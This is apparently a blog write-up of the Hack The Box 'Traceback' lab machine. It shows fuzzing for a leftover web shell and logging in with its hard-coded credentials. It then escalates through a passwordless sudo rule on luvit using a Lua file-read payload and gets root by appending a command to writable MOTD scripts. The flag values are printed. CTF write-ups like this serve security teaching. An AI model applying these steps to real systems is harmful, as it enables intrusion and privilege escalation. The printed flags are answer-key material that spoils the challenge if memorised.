---
layout: post
title: "[HTB] Traceback"
categories:
    - Hacking and Security
    - Offensive Security
    - Web Security
tags:
    - CTF
    - Hack The Box
---
Traceback is an easy Linux-based machine released on the 14th of March 2020 and reachable on the IP address `10.10.10.181` (despite what's written on the info card).

![HTB Traceback information card](/assets/images/htb-traceback-info-card.jpg)

<!--more-->

## User flag

Nmap indicates us that the Traceback machine is running OpenSSH and Apache:

```
$ nmap -A 10.10.10.181 | tee nmap.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 19:03 IST
Nmap scan report for 10.10.10.181
Host is up (0.029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.30 seconds
```

Let's have a look at the website available on port 80:

![Landing page of the website accessible on port 80](/assets/images/htb-traceback-landing-page.png)

The `index.html` page doesn't contain much but this HTML comment:

```
<center>
	<h1>This site has been owned</h1>
	<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
	<h3> - Xh4H - </h3>
	<!--Some of the best web shells that you might need ;)-->
</center>
```

It is definitely a hint. A quick search on DuckDuckGo with the keywords "Xh4H web shell" returns https://github.com/Xh4H/Web-Shells as first result. It is a Git repository full of web shells. One of them is certainly the one that the original attacker has left on the server!

To create a wordlist with the web shells comprised in the Git repository, I called the [GitHub API](https://developer.github.com/v3/git/trees/#get-a-tree) with this one-liner command-line:

```
$ curl -s https://api.github.com/repos/Xh4H/Web-Shells/git/trees/4c9bade954938d56597325b872739c1a2463cf91 | jq -r .tree[].path | grep -vi readme | tee web-shells.txt
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php
```

Then, I fuzzed the web server with this wordlist using ZAP:

![Output from ZAP's fuzzer with the list of web shells previously generated](/assets/images/htb-traceback-web-shells.png)

And voila! The backdoor is accessible at http://10.10.10.181/smevk.php:

![SmEvk web shell's login page](/assets/images/htb-traceback-smevk-login-page.png)

The credentials `admin:admin` are hard-coded in the web shell: https://github.com/Xh4H/Web-Shells/blob/master/smevk.php#L14-L15.

Then, I used the terminal available in the "Console" tab to poke around a little:

```
$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
$ cat /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

A Lua tool?

```
$ cat /home/webadmin/.bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
rm privesc.lua
logout
$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

It indeed seems that the `webadmin` user can execute `/home/sysadmin/luvit` on behalf of `sysadmin` without password.

[Luvit](https://luvit.io/) is a program which "implements the same APIs as Node.js, but in Lua!". We can therefore use it to execute Lua payloads. We fill prepare one for reading the user flag:

```
$ printf 'file = io.open("/home/sysadmin/user.txt", "r")\nio.input(file)\nprint(io.read())\nio.close(file)\n' > /tmp/read_flag.lua
```

And then:

```
$ sudo -u sysadmin /home/sysadmin/luvit /tmp/read_flag.lua
```

Which gives us the user flag: `e564de9f40e354deb591fa121937ca0d`.

## Root flag

Before going further, I wanted to get a "real" shell so I added an SSH public key of mine to the `sysadmin` user's authorised keys and then connected back to the server as `sysadmin` via SSH.

During the rest of my investigation, something caught my attention:

```
$ find / -type f -writable 2>/dev/null | grep -v '^/proc' | grep -v '^/sys'
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
/home/sysadmin/.bashrc
/home/sysadmin/luvit
/home/sysadmin/.bash_logout
/home/sysadmin/.ssh/authorized_keys
/home/sysadmin/.cache/motd.legal-displayed
/home/sysadmin/.bash_history
/home/sysadmin/.profile
/home/webadmin/note.txt
```

The `sysadmin` user can edit the MOTD scripts!

```
sysadmin@traceback:~$ ls -al /etc/update-motd.d/
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Aug 23 16:22 00-header
-rwxrwxr-x  1 root sysadmin  982 Aug 23 16:22 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Aug 23 16:22 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Aug 23 16:22 80-esm
-rwxrwxr-x  1 root sysadmin  299 Aug 23 16:22 91-release-upgrade
```

This is really bad (for the server's owner at least) because these scripts are executed upon any new SSH connection as defined in `/etc/pam.d/sshd`:

```
...
# Print the message of the day upon successful login.
# This includes a dynamically generated part from /run/motd.dynamic
# and a static (admin-editable) part from /etc/motd.
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
....
```

All I need is to modify one of those scripts to print the root flag:

```
$ echo 'cat /root/root.txt' >> /etc/update-motd.d/00-header
```

And when one logs in via SSH:

```
$ ssh -o PasswordAuthentication=no -i ~/.ssh/tr
aceback sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land

fa6d76ff6866c37f381b5f6e40f8ce89


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Aug 23 16:23:41 2020 from 10.10.14.16
$
```

The root flag was `fa6d76ff6866c37f381b5f6e40f8ce89`.
